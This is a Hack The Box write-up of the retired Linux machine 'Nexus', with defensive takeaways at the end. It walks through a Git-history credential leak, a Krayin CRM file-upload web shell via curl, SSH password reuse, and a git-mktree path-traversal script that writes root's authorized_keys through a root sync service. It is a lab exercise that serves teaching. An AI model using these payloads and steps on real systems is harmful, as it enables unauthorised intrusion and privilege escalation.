# Hack The Box — Nexus

> **Difficulty:** Medium · **OS:** Linux · **Status:** Retired
> Flags are intentionally **redacted** in accordance with the Hack The Box content policy.

Nexus chains a **leaked credential in Git history** into an **authenticated file-upload RCE** in the Krayin CRM, then escalates through **SSH password reuse** to a user shell and finally exploits a **path-traversal in a root-owned Gitea template-sync service** to plant an SSH key for `root`.

```
recon ──► git credential leak ──► Krayin CRM RCE (www-data)
      └─► .env password reuse ──► SSH as jones (user)
                              └─► gitea-template-sync path traversal ──► root
```

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 2000 10.129.X.X
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | nginx 1.24.0 — redirects to `nexus.htb` |

Add the virtual hosts and fuzz for subdomains:

```bash
echo "10.129.X.X nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w subdomains.txt -fs <baseline>
```

- `git.nexus.htb` → **Gitea**
- `billing.nexus.htb` → **Krayin CRM v2.2.0** (redirects to `/admin/login`)

The landing page leaks a staff email: `j.matthew@nexus.htb`.

---

## 2. Credential Leak in Git History

Gitea exposes a public repository. Clone it and inspect the full history:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git log -p --all | grep -i password
```

An older commit contains the database password in `docker-compose` / `.env`:

```
DB_PASSWORD=<redacted>
```

Combined with the staff email, these are valid credentials for the CRM admin panel.

---

## 3. Foothold — Krayin CRM File-Upload RCE

Log in at `http://billing.nexus.htb/admin/login` with `j.matthew@nexus.htb` and the leaked password.

The TinyMCE media-upload endpoint (`/admin/tinymce/upload`, reachable from the Mail composer) performs **no server-side file-type validation**, so a `.php` file is stored and served as-is under `/storage/tinymce/`.

```bash
# after grabbing a CSRF token from an authenticated page:
printf '%s' '<?php system($_GET["c"]); ?>' > shell.php
curl -s -b cookies.txt -X POST http://billing.nexus.htb/admin/tinymce/upload \
     -H "X-CSRF-TOKEN: $TOKEN" -F "_token=$TOKEN" \
     -F "file=@shell.php;type=image/png;filename=shell.php"
# => {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}

curl "http://billing.nexus.htb/storage/tinymce/<hash>.php?c=id"
# uid=33(www-data) gid=33(www-data)
```

For an interactive shell, replace the payload with a reverse shell and start a listener (`nc -lvnp 4444`).

---

## 4. User — Password Reuse

The application `.env` on disk reveals a second password:

```bash
cat /var/www/krayin/.env       # DB_PASSWORD=<redacted-2>
grep sh$ /etc/passwd           # jones:...:/bin/bash
```

That password is reused for the `jones` system account:

```bash
ssh jones@nexus.htb            # password: <redacted-2>
cat ~/user.txt                 # user flag
```

---

## 5. Root — Path Traversal in the Gitea Template Sync Service

A root-owned oneshot service runs every 60 seconds:

```ini
# /etc/systemd/system/gitea-template-sync.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

The script pulls every Gitea repo flagged as a **template**, lists its files with
`git ls-tree -r HEAD`, and writes each blob to a staging directory:

```python
target = os.path.join(stage_path, filepath)   # filepath is attacker-controlled
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, 'wb') as f:
    f.write(blob)                              # runs as root
```

Git tree paths are never sanitised, so a filename like
`../../../../root/.ssh/authorized_keys` escapes the staging directory and is
written **as root**. A normal `git add` refuses `..` paths, so build the tree with
plumbing (`git mktree`):

```bash
# as jones (jones has a Gitea account with the reused password)
curl -s -u "$CREDS" -X POST http://localhost:3000/api/v1/user/repos \
     -H 'Content-Type: application/json' \
     -d '{"name":"rce","auto_init":false,"default_branch":"master"}'

D=$(mktemp -d); cd "$D"; git init -q
echo "$MY_PUBKEY" > ak
BLOB=$(git hash-object -w ak)
T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T=$(printf '040000 tree %s\t.ssh\n'  "$T" | git mktree)
T=$(printf '040000 tree %s\troot\n'  "$T" | git mktree)
for i in $(seq 8); do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
C=$(git commit-tree "$T" -m x); git update-ref refs/heads/master "$C"
git push -f "http://$CREDS@localhost:3000/jones/rce.git" master:master

# mark the repo as a template so the root service syncs it
curl -s -u "$CREDS" -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
     -H 'Content-Type: application/json' -d '{"template":true}'
```

`git ls-tree -r HEAD` now yields the traversal path
`../../../../../../../../root/.ssh/authorized_keys`. Within ~60 s the root timer
writes the key, then:

```bash
ssh -i root_key root@nexus.htb
cat /root/root.txt             # root flag
```

---

## Key Takeaways

- **Secrets in Git history persist** even after being "removed" in a later commit — scrub history, rotate credentials.
- **Never trust file names/paths from untrusted input** (uploads *or* git tree entries). Validate MIME/extension server-side and canonicalise paths before writing.
- **Password reuse** across a database, an app account, and a system/Gitea account turns one leak into full compromise.
- A privileged automation that writes attacker-influenced paths is a **root-level arbitrary file write** — the classic bridge from user to root.
